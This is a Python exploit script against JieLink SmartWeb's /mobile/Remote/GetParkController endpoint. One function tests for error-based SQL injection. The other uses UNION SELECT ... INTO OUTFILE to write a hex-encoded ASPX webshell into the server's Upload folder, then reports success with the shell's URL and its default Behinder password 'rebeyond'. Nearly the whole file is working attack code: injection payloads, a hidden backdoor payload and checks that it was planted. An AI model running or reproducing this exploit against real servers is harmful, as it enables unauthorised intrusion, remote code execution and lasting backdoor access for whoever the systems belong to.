import requests


headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def exp_check(url):
    newurl = url+ "/mobile/Remote/GetParkController"
    payload = "deviceId=-1' and updatexml(1,concat(0x7e,(select version()),0x7e),1)#"
    try:
        r = requests.post(newurl,data=payload,headers=headers,timeout=5)
        print("MESSAGE%3a%0a+XPATH+syntax+error%3a" in r.text)
        print(r.text)
        if "MESSAGE%3a%0a+XPATH+syntax+error%3a" in r.text:
            return 1
        else:
            return 2
    except:
        return 3

def exp_others(url):
    try:
        newurl = url+ "/mobile/Remote/GetParkController"
        payload = "deviceId=1'UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,0x3C25402050616765204C616E67756167653D2243232220253E3C2540496D706F7274204E616D6573706163653D2253797374656D2E5265666C656374696F6E22253E3C2553657373696F6E2E41646428226B222C226534356533323966656235643932356222293B627974655B5D206B203D20456E636F64696E672E44656661756C742E47657442797465732853657373696F6E5B305D202B202222292C63203D20526571756573742E42696E6172795265616428526571756573742E436F6E74656E744C656E677468293B417373656D626C792E4C6F6164286E65772053797374656D2E53656375726974792E43727970746F6772617068792E52696A6E6461656C4D616E6167656428292E437265617465446563727970746F72286B2C206B292E5472616E73666F726D46696E616C426C6F636B28632C20302C20632E4C656E67746829292E437265617465496E7374616E636528225522292E457175616C732874686973293B253E+INTO+outfile+'C%3a/Program+Files+(x86)/JieLink/SmartWeb/Upload/fuck1.aspx'#"
        requests.post(newurl,data=payload,headers=headers,timeout=5)
        r = requests.get(newurl+"/upload/fuck1.aspx",headers=headers,timeout=5,verify=False)
        if r.status_code == 200:
            return "webshell写入成功： {0}//upload/fuck1.aspx        \n默认为冰蝎后门,密码为rebeyond".format(url)
    except:
        return 3